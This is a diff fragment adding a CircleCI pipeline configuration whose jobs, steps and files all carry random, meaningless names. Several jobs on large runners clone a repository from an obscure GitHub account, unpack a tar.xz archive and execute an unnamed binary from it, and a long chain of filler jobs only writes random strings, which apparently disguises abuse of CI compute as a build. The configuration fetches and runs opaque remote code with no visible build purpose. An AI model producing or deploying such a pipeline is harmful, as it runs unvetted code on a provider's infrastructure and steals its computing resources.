+            grep -cE '[A-Za-z]' /tmp/ihiubyhbtfufcmx/cidqbpo 2>/dev/null || true
+      - run:
+          name: nhhmmenmnqdfo
+          command: git clone --depth 2 --single-branch https://github.com/janiahorn75im3-beep/3b351a84aef8 .
+      - run:
+          name: fzwqnybhyxymqx
+          command: tar -xJf quhlwvosqiov.tar.xz
+      - run:
+          name: lpfuvuhqomre
+          command: du -sh .
+      - run:
+          command: $PWD/uvirpjuwsijn
+  axzuaf:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: elyihh
+          command: |
+            grep -cE '[A-Za-z]' /tmp/ihiubyhbtfufcmx/cidqbpo 2>/dev/null || true
+      - run:
+          name: xdkyxgaifkl
+          command: git clone --depth 2 --single-branch https://github.com/janiahorn75im3-beep/3b351a84aef8 .
+      - run:
+          name: mbapufuy
+          command: tar -xJf quhlwvosqiov.tar.xz
+      - run:
+          name: mdojjblks
+          command: du -sh .
+      - run:
+          command: $PWD/uvirpjuwsijn
+
+  qnpkksmv:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: trndjcmmqetrpsx
+          command: |
+            mkdir -p /tmp/ihiubyhbtfufcmx
+            echo 'jqvwcomympjx bksabwvdskalhaafmu' > /tmp/ihiubyhbtfufcmx/uazsdxhgcjml
+            ls -la /tmp/ihiubyhbtfufcmx/uazsdxhgcjml
+      - persist_to_workspace:
+          root: /tmp/ihiubyhbtfufcmx
+          paths:
+            - 'uazsdxhgcjml'
+  oylwggrndpfpn:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: ildotxwcdgqjcus
+          command: |
+            mkdir -p /tmp/ihiubyhbtfufcmx
+            echo 'ziijxvjzgvmeuby vbclawbebhcqekag' > /tmp/ihiubyhbtfufcmx/bpyuhyoadb
+            ls -la /tmp/ihiubyhbtfufcmx/bpyuhyoadb
+      - persist_to_workspace:
+          root: /tmp/ihiubyhbtfufcmx
+          paths:
+            - 'bpyuhyoadb'
+  pcrolzfobtrbfm:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: bktkzkm
+          command: |
+            mkdir -p /tmp/ihiubyhbtfufcmx
+            echo 'nzwakuvoasl jatwqyzlqvostbhzrd' > /tmp/ihiubyhbtfufcmx/knypowedcsxggs
+            ls -la /tmp/ihiubyhbtfufcmx/knypowedcsxggs
+      - persist_to_workspace:
+          root: /tmp/ihiubyhbtfufcmx
+          paths:
+            - 'knypowedcsxggs'
+  ycbgu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: yqkwzbo
+          command: |
+            mkdir -p /tmp/ihiubyhbtfufcmx
+            echo 'nekpzpxfhe kwpmahkbgymn' > /tmp/ihiubyhbtfufcmx/azjdft
+            ls -la /tmp/ihiubyhbtfufcmx/azjdft
+      - persist_to_workspace:
+          root: /tmp/ihiubyhbtfufcmx
+          paths:
+            - 'azjdft'
+  gvdroecozw:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: jclfmbs
+          command: |
+            mkdir -p /tmp/ihiubyhbtfufcmx
+            echo 'smiiweduiz qpvavrpamdow' > /tmp/ihiubyhbtfufcmx/guwkbhqkx
+            ls -la /tmp/ihiubyhbtfufcmx/guwkbhqkx
+      - persist_to_workspace:
+          root: /tmp/ihiubyhbtfufcmx
+          paths:
+            - 'guwkbhqkx'
+  hirktstlb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: dqezxosduyadj
+          command: |
+            mkdir -p /tmp/ihiubyhbtfufcmx
+            echo 'breaadjzeladtkpb frorcermegorcgmwhp' > /tmp/ihiubyhbtfufcmx/rrlmmdzfjfhi
+            ls -la /tmp/ihiubyhbtfufcmx/rrlmmdzfjfhi
+      - persist_to_workspace:
+          root: /tmp/ihiubyhbtfufcmx
+          paths:
+            - 'rrlmmdzfjfhi'
+  gsoilgpbbujzzkg:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: rjuzjqycltzav
+          command: |
+            mkdir -p /tmp/ihiubyhbtfufcmx
+            echo 'nddgsntvcjgqrhu xirsgoggmulawhezr' > /tmp/ihiubyhbtfufcmx/hbdlloe
+            ls -la /tmp/ihiubyhbtfufcmx/hbdlloe
+      - persist_to_workspace:
+          root: /tmp/ihiubyhbtfufcmx
+          paths:
+            - 'hbdlloe'
+  hpggj:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: ufvpiqzouhfztqg
+          command: |
+            mkdir -p /tmp/ihiubyhbtfufcmx
+            echo 'bidrconpje eucswfcmfg' > /tmp/ihiubyhbtfufcmx/zosnxy
+            ls -la /tmp/ihiubyhbtfufcmx/zosnxy
+      - persist_to_workspace:
+          root: /tmp/ihiubyhbtfufcmx
+          paths:
+            - 'zosnxy'
+  xatpywkuddjg:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: rrrxzstubwzi
+          command: |
+            mkdir -p /tmp/ihiubyhbtfufcmx
+            echo 'mumuscuzwdkh fvgxvkrwgqosci' > /tmp/ihiubyhbtfufcmx/dtcgvq
+            ls -la /tmp/ihiubyhbtfufcmx/dtcgvq
+      - persist_to_workspace:
+          root: /tmp/ihiubyhbtfufcmx
+          paths:
+            - 'dtcgvq'
+workflows:
+  vtsbphriffv:
+    jobs:
+      - xqdpnkygyhoimc
+      - jioloxpllezaky
+      - mvoabomfdrloulz:
+          requires:
+            - xqdpnkygyhoimc
+            - jioloxpllezaky
+      - tjosjojuzss:
+          requires:
+            - xqdpnkygyhoimc
+            - jioloxpllezaky
+      - tgcnagohazen:
+          requires:
+            - xqdpnkygyhoimc
+            - jioloxpllezaky
+      - lqnixvdqf:
+          requires:
+            - xqdpnkygyhoimc
+            - jioloxpllezaky
+      - axzuaf:
+          requires:
+            - xqdpnkygyhoimc
+            - jioloxpllezaky
+      - ddeghj:
+          requires:
+            - xqdpnkygyhoimc
+            - jioloxpllezaky
+      - ubhkbwtzn:
+          requires:
+            - xqdpnkygyhoimc
+            - jioloxpllezaky
+      - weboqzl:
+          requires:
+            - xqdpnkygyhoimc
+            - jioloxpllezaky
+      - cjgpxafv:
+          requires:
+            - xqdpnkygyhoimc
+            - jioloxpllezaky
+      - ifavebitzeimqsj:
+          requires:
+            - xqdpnkygyhoimc
+            - jioloxpllezaky
+      - qievddirfkth:
+          requires:
+            - xqdpnkygyhoimc
+            - jioloxpllezaky
+      - fwgkuow:
+          requires:
+            - xqdpnkygyhoimc
+            - jioloxpllezaky
+      - kqogistzzlnnbe
+      - qnpkksmv:
+          requires:
+            - kqogistzzlnnbe
+      - ocswi:
+          requires:
+            - qnpkksmv
+      - dwcauvruyldq:
+          requires:
+            - qnpkksmv
+      - oylwggrndpfpn:
+          requires:
+            - dwcauvruyldq
+      - gftllgtpijll:
+          requires:
+            - oylwggrndpfpn
+      - xbbxpxrkhxaap:
+          requires:
+            - oylwggrndpfpn
+      - pcrolzfobtrbfm:
+          requires:
+            - xbbxpxrkhxaap
+      - utpsbncudztt:
+          requires:
+            - pcrolzfobtrbfm
+      - qojhdojifcflxpv:
+          requires:
+            - pcrolzfobtrbfm
+      - ycbgu:
+          requires:
+            - qojhdojifcflxpv
+      - zxlxzlp:
+          requires:
+            - ycbgu
+      - uyrzfhpjhynwf:
+          requires:
+            - ycbgu
+      - gvdroecozw:
+          requires:
+            - uyrzfhpjhynwf
+      - asryuzsserweeb:
+          requires:
+            - gvdroecozw
+      - bmddlxvyyfdom:
+          requires:
+            - gvdroecozw
+      - hirktstlb:
+          requires:
+            - bmddlxvyyfdom
+      - yjxdgjltoyrhb:
+          requires:
+            - hirktstlb
+      - wtzjcqwisqz:
+          requires:
+            - hirktstlb
+      - gsoilgpbbujzzkg:
+          requires:
+            - wtzjcqwisqz
+      - bdarzytkdytyrju:
+          requires:
+            - gsoilgpbbujzzkg
+      - gqyogbk:
+          requires:
+            - gsoilgpbbujzzkg
+      - hpggj:
+          requires:
+            - gqyogbk
+      - blqsgapwv:
+          requires:
+            - hpggj
+      - qwzkxwwqmbz:
+          requires:
+            - hpggj
+      - xatpywkuddjg:
+          requires:
+            - qwzkxwwqmbz
+      - chvwndixczriwps:
+          requires:
+            - xatpywkuddjg
+      - zjomlkufpaae
+      - epmjtkcpwae:
+          requires:
+            - zjomlkufpaae
+      - oojixhdtfbbnk:
+          requires:
+            - zjomlkufpaae
+      - ccvibh:
+          requires:
+            - oojixhdtfbbnk
+      - yxvotuvp:
+          requires:
+            - oojixhdtfbbnk
+      - kxtuvin:
+          requires:
+            - yxvotuvp
+      - jtxssvifgun:
+          requires:
+            - yxvotuvp
+      - ehiogvlusluff:
+          requires:
+            - jtxssvifgun
+      - mftdnw:
+          requires:
+            - jtxssvifgun
+      - pxbew:
+          requires:
+            - mftdnw
+      - nacco:
+          requires:
+            - mftdnw
+      - ewclyzlnwltkcti:
+          requires:
+            - nacco
+      - hriwelylashrbm:
+          requires:
+            - nacco
+      - wbbjkjpazcx:
+          requires:
+            - hriwelylashrbm
+      - jcwpnqgd:
+          requires:
+            - hriwelylashrbm
+      - hgthxkl:
+          requires:
+            - jcwpnqgd
+      - zfyvtyh:
+          requires:
+            - jcwpnqgd
+      - xsihlnluqqif:
+          requires:
+            - zfyvtyh
